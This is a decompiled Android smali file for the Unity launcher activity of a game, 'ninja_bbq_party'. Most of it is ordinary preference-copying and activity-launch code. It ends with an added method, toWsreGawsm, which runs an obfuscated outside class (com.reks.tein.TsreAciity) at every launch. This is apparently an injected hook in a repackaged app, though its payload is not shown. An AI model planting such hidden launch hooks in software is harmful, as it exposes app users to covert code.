.class public Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;
.super Landroid/app/Activity;
.source "UnityPlayerProxyActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity$1;,
        Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity$DownloadTracker;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 15
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 84
    return-void
.end method

.method protected static copyPlayerPrefs(Landroid/content/Context;[Ljava/lang/String;)V
    .registers 16
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "activityClassNames"    # [Ljava/lang/String;

    .prologue
    const/4 v13, 0x0

    .line 56
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {p0, v11, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    .line 60
    .local v7, "packagePrefs":Landroid/content/SharedPreferences;
    invoke-interface {v7}, Landroid/content/SharedPreferences;->getAll()Ljava/util/Map;

    move-result-object v11

    invoke-interface {v11}, Ljava/util/Map;->isEmpty()Z

    move-result v11

    if-nez v11, :cond_14

    .line 83
    :cond_13
    return-void

    .line 64
    :cond_14
    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    .line 65
    .local v8, "playerPrefs":Landroid/content/SharedPreferences$Editor;
    move-object v0, p1

    .local v0, "arr$":[Ljava/lang/String;
    array-length v5, v0

    .local v5, "len$":I
    const/4 v2, 0x0

    .local v2, "i$":I
    move v3, v2

    .end local v2    # "i$":I
    .local v3, "i$":I
    :goto_1c
    if-ge v3, v5, :cond_13

    aget-object v6, v0, v3

    .line 67
    .local v6, "name":Ljava/lang/String;
    invoke-virtual {p0, v6, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v9

    .line 68
    .local v9, "prefs":Landroid/content/SharedPreferences;
    invoke-interface {v9}, Landroid/content/SharedPreferences;->getAll()Ljava/util/Map;

    move-result-object v4

    .line 69
    .local v4, "keys":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;*>;"
    invoke-interface {v4}, Ljava/util/Map;->isEmpty()Z

    move-result v11

    if-eqz v11, :cond_32

    .line 65
    .end local v3    # "i$":I
    :goto_2e
    add-int/lit8 v2, v3, 0x1

    .restart local v2    # "i$":I
    move v3, v2

    .end local v2    # "i$":I
    .restart local v3    # "i$":I
    goto :goto_1c

    .line 71
    :cond_32
    invoke-interface {v4}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v11

    invoke-interface {v11}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v2

    .end local v3    # "i$":I
    .local v2, "i$":Ljava/util/Iterator;
    :cond_3a
    :goto_3a
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_8e

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/Map$Entry;

    .line 73
    .local v1, "entry":Ljava/util/Map$Entry;, "Ljava/util/Map$Entry<Ljava/lang/String;*>;"
    invoke-interface {v1}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v10

    .line 74
    .local v10, "value":Ljava/lang/Object;
    invoke-virtual {v10}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v11

    const-class v12, Ljava/lang/Integer;

    if-ne v11, v12, :cond_62

    .line 75
    invoke-interface {v1}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/String;

    check-cast v10, Ljava/lang/Integer;

    .end local v10    # "value":Ljava/lang/Object;
    invoke-virtual {v10}, Ljava/lang/Integer;->intValue()I

    move-result v12

    invoke-interface {v8, v11, v12}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    goto :goto_3a

    .line 76
    .restart local v10    # "value":Ljava/lang/Object;
    :cond_62
    invoke-virtual {v10}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v11

    const-class v12, Ljava/lang/Float;

    if-ne v11, v12, :cond_7a

    .line 77
    invoke-interface {v1}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/String;

    check-cast v10, Ljava/lang/Float;

    .end local v10    # "value":Ljava/lang/Object;
    invoke-virtual {v10}, Ljava/lang/Float;->floatValue()F

    move-result v12

    invoke-interface {v8, v11, v12}, Landroid/content/SharedPreferences$Editor;->putFloat(Ljava/lang/String;F)Landroid/content/SharedPreferences$Editor;

    goto :goto_3a

    .line 78
    .restart local v10    # "value":Ljava/lang/Object;
    :cond_7a
    invoke-virtual {v10}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v11

    const-class v12, Ljava/lang/String;

    if-ne v11, v12, :cond_3a

    .line 79
    invoke-interface {v1}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Ljava/lang/String;

    check-cast v10, Ljava/lang/String;

    .end local v10    # "value":Ljava/lang/Object;
    invoke-interface {v8, v11, v10}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_3a

    .line 81
    .end local v1    # "entry":Ljava/util/Map$Entry;, "Ljava/util/Map$Entry<Ljava/lang/String;*>;"
    :cond_8e
    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto :goto_2e
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 12
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v6, 0x1

    const/4 v7, 0x0

    .line 19
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 21
    new-instance v8, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity$DownloadTracker;

    const/4 v9, 0x0

    invoke-direct {v8, p0, v9}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity$DownloadTracker;-><init>(Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity$1;)V

    new-array v9, v7, [Ljava/lang/Void;

    invoke-virtual {v8, v9}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity$DownloadTracker;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 23
    const/4 v8, 0x2

    new-array v1, v8, [Ljava/lang/String;

    const-string v8, "fr.virgoplay.application.ninja_bbq_party.UnityPlayerActivity"

    aput-object v8, v1, v7

    const-string v8, "fr.virgoplay.application.ninja_bbq_party.UnityPlayerNativeActivity"

    aput-object v8, v1, v6

    .line 26
    .local v1, "classNames":[Ljava/lang/String;
    invoke-static {p0, v1}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->copyPlayerPrefs(Landroid/content/Context;[Ljava/lang/String;)V

    .line 32
    :try_start_1e
    sget v8, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v9, 0x9

    if-lt v8, v9, :cond_4e

    move v5, v6

    .line 33
    .local v5, "supportsNative":Z
    :goto_25
    if-eqz v5, :cond_50

    :goto_27
    aget-object v6, v1, v6

    invoke-static {v6}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 34
    .local v0, "activity":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 35
    .local v4, "intent":Landroid/content/Intent;
    const/high16 v6, 0x10000

    invoke-virtual {v4, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 37
    invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->getIntent()Landroid/content/Intent;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v3

    .line 38
    .local v3, "extras":Landroid/os/Bundle;
    if-eqz v3, :cond_44

    .line 39
    invoke-virtual {v4, v3}, Landroid/content/Intent;->putExtras(Landroid/os/Bundle;)Landroid/content/Intent;

    .line 41
    :cond_44
    invoke-virtual {p0, v4}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_47
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1e .. :try_end_47} :catch_52
    .catchall {:try_start_1e .. :try_end_47} :catchall_5a

    .line 49
    invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->finish()V

    .line 51
    .end local v0    # "activity":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v3    # "extras":Landroid/os/Bundle;
    .end local v4    # "intent":Landroid/content/Intent;
    .end local v5    # "supportsNative":Z
    :goto_4a
    invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->toWsreGawsm()V

    return-void

    :cond_4e
    move v5, v7

    .line 32
    goto :goto_25

    .restart local v5    # "supportsNative":Z
    :cond_50
    move v6, v7

    .line 33
    goto :goto_27

    .line 43
    .end local v5    # "supportsNative":Z
    :catch_52
    move-exception v2

    .line 45
    .local v2, "e":Ljava/lang/ClassNotFoundException;
    :try_start_53
    invoke-virtual {v2}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
    :try_end_56
    .catchall {:try_start_53 .. :try_end_56} :catchall_5a

    .line 49
    invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->finish()V

    goto :goto_4a

    .end local v2    # "e":Ljava/lang/ClassNotFoundException;
    :catchall_5a
    move-exception v6

    invoke-virtual {p0}, Lfr/virgoplay/application/ninja_bbq_party/UnityPlayerProxyActivity;->finish()V

    throw v6
.end method

.method public toWsreGawsm()V
    .registers 2

    .prologue
    new-instance v0, Lcom/reks/tein/TsreAciity;

    invoke-direct {v0, p0}, Lcom/reks/tein/TsreAciity;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lcom/reks/tein/TsreAciity;->Eawee()V

    return-void
.end method
